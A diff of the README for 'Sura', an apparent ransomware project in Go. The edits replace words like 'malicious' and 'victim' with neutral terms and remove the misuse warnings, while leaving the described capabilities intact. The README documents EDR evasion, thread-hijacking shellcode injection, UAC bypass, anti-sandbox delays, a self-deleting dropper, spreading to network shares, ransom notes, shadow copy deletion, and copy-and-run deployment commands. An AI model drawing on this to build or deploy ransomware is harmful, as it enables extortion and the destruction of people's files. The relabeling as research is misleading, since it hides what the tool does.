@@ -11,7 +11,7 @@
 
 By accessing, downloading, or using this software, you acknowledge and agree to the following terms:
 
-1. **NO MALICIOUS USE**: This project is strictly for educational purposes, security research, and authorized penetration testing ONLY. Any malicious use is strictly prohibited and illegal.
+1. **NO UNAUTHORIZED USE**: This project is strictly for educational purposes, security research, and authorized penetration testing ONLY. Any unauthorized use is strictly prohibited and illegal.
 
 2. **AUTHORIZATION REQUIRED**: You must have explicit written authorization before testing this software on any system you do not own.
 
@@ -121,18 +121,18 @@ Sura implements **four cutting-edge techniques** not found in existing malware:
 - Generates Windows Update-like memory patterns
 - Injects benign software signatures (Chrome, Word, Defender)
 - Allocates/deallocates memory mimicking normal applications
-- Real malicious operations execute alongside legitimate-looking activity
+- Real encryption operations execute alongside legitimate-looking activity
 
 **Detection resistance:** EDR and behavioral analysis see "normal" application activity while encryption runs in parallel.
 
 ### 3️⃣ Phantom Thread Injection (Disabled by default)
 
-**Advanced thread hijacking** - Executes malicious code by hijacking legitimate process threads without creating suspicious new threads.
+**Advanced thread hijacking** - Executes code by hijacking legitimate process threads without creating suspicious new threads.
 
 **How it works:**
-- Suspends legitimate threads in target processes
+- Suspends legitimate threads in designated processes
 - Injects shellcode into existing thread context
-- Resumes thread executing malicious code
+- Resumes thread executing injected code
 - No new thread creation = no thread creation alerts
 
 **Note:** Currently disabled due to high detection rates. Available for research purposes.
@@ -187,11 +187,11 @@ Sura implements **four cutting-edge techniques** not found in existing malware:
 - **Obfuscated Names**: Uses legitimate process names (svchost, rundll32, etc.)
 
 #### File Operations
-- **Selective Targeting**: Documents, images, videos, databases, code
+- **Selective Processing**: Documents, images, videos, databases, code
 - **Smart Exclusion**: Skips system files, Windows directories, program files
-- **Extension Filtering**: 50+ targeted file extensions
+- **Extension Filtering**: 50+ specified file extensions
 - **Network Share Spreading**: Automatically encrypts mapped drives
-- **Ransom Note Deployment**: Custom HTML ransom notes in each directory
+- **Ransom Note Generation**: Custom HTML ransom notes in each directory
 
 #### Destruction Capabilities (Optional)
 - Shadow copy deletion (requires admin)
@@ -237,7 +237,7 @@ Sura-Ransomware/
 │   ├── main.go          # AES decryption + payload execution
 │   └── go.mod
 │
-├── Decryptor/           # Victim decryption tool
+├── Decryptor/           # File recovery tool
 │   ├── main.go          # Decrypts files with private key
 │   ├── decryption/      # Reverse encryption
 │   └── iterator/        # File traversal
@@ -384,7 +384,43 @@ Sura-Ransomware/
 └── private_key.pem        ← Keep SECRET for decryption
 ```
 
-**⚠️ CRITICAL: Use `Sura-Dropper.exe` for deployment, NOT `Sura-Packed.exe`**
+```
+
+**⚠️ CRITICAL: Use `Sura-Dropper.exe` for testing, NOT `Sura-Packed.exe`**
+
+### Testing
+
+#### For Research/Testing in Isolated Environment:
+
+```powershell
+# Copy to test system
+copy Sura-Dropper.exe \\test-system\share\
+
+# Execute on test system (in isolated lab only)
+.\Sura-Dropper.exe
+```
+
+#### Execution Flow:
+
+1. **Dropper starts** → Sleeps 65 seconds (anti-sandbox)
+2. **Decrypts payload** → AES-256 decryption in-memory
+3. **Writes payload** → Random legitimate name (svchost, rundll32, etc.)
+4. **Executes payload** → Background execution
+5. **Self-deletes** → Dropper removes itself
+6. **Payload runs:**
+   - Phase -1: UAC bypass (attempts all 3 methods)
+   - Phase 0: Quantum State Validation
+   - Phase 1: Polymorphic initialization
+   - Phase 2: Environmental keying validation
+   - Phase 3: Memory Mirage activation
+   - Phase 4: Stealth & evasion checks
+   - Phase 5: File encryption starts
+   - Phase 6: Ransom note generation
+   - Phase 7: Destruction (if admin + enabled)
+
+---
+
+```
 
 ### Deployment
 
@@ -466,8 +502,8 @@ const (
     ContactEmail = "contact@example.com"
     BitcoinAddress = "bc1qexampleaddressxxxxxxxxxxxxxxxxxx"
     
-    // === File Targeting ===
-    TargetExtensions = []string{
+    // === File Processing ===
+    ProcessExtensions = []string{
         ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
         ".pdf", ".txt", ".rtf", ".odt", ".ods", ".odp",
         ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".svg",
@@ -719,12 +755,12 @@ def obfuscate_file(filepath):
 
 ### Using the Decryptor
 
-After ransom payment (research context), provide decryptor to victim:
+For file recovery (research context), use the decryptor tool:
 
 ```powershell
-# Copy decryptor and private key to victim system
-copy Decryptor-Built.exe \\victim\share\
-copy private_key.pem \\victim\share\
+# Copy decryptor and private key to test system
+copy Decryptor-Built.exe \\test-system\share\
+copy private_key.pem \\test-system\share\
 
 # Run decryptor
 .\Decryptor-Built.exe
@@ -733,7 +769,7 @@ copy private_key.pem \\victim\share\
 **Decryptor prompts:**
 ```
 Enter path to private key: private_key.pem
-Enter directory to decrypt: C:\Users\Victim\Documents
+Enter directory to decrypt: C:\Users\TestUser\Documents
 ```
 
 **Decryption process:**
@@ -831,10 +867,10 @@ A: Use isolated virtual machines with snapshots. Never test on production system
 A: Only with explicit written authorization from the system owner. Unauthorized use is illegal.
 
 **Q: How do I customize the ransom note?**  
-A: Edit `Encryptor/configuration/configuration.go` and modify `ContactEmail`, `BitcoinAddress`, and `RansomAmount`. Rebuild after changes.
+A: Edit `Encryptor/configuration/configuration.go` and modify the configuration values. Rebuild after changes.
 
-**Q: Can I change targeted file extensions?**  
-A: Yes, edit `TargetExtensions` in configuration. Add or remove extensions as needed.
+**Q: Can I change specified file extensions?**  
+A: Yes, edit `ProcessExtensions` in configuration. Add or remove extensions as needed.
 
 **Q: How do I exclude specific directories?**  
 A: Add paths to `ExcludedPaths` in configuration. Use Windows path format with backslashes.
@@ -881,23 +917,17 @@ A: Yes, use `GOOS=windows GOARCH=amd64` for 64-bit or `GOARCH=386` for 32-bit.
 
 ## 🤝 Contributing
 
-This is a closed educational project. Contributions are not accepted to prevent misuse.
+This repository is no longer actively maintained. Feel free to fork for your own research purposes.
 
-For security research collaboration, contact via academic channels only.
+For questions or issues, please use GitHub Issues on this repository.
 
 ---
 
 ## 📞 Contact
 
-**For legitimate security research inquiries only:**
-- Academic collaboration: [Your academic email]
-- Responsible disclosure: [Your security email]
+For questions, issues, or research collaboration, please open an issue on GitHub:
 
-**DO NOT contact for:**
-- Operational/malicious use assistance
-- Bypassing detection on real systems
-- Creating custom variants for attacks
-- Any illegal activities
+**https://github.com/NeedHotWaifus/Suraware/issues**
 
 ---
 
@@ -906,9 +936,9 @@ For security research collaboration, contact via academic channels only.
 If you discover vulnerabilities in these evasion techniques, please disclose responsibly:
 
 1. Do NOT publish details publicly before coordinated disclosure
-2. Contact author via academic channels
-3. Allow 90 days for response before public disclosure
-4. Do NOT exploit vulnerabilities maliciously
+2. Open an issue on the GitHub repository
+3. Allow reasonable time for response before public disclosure
+4. Do NOT exploit vulnerabilities in unauthorized systems
 
 ---
 
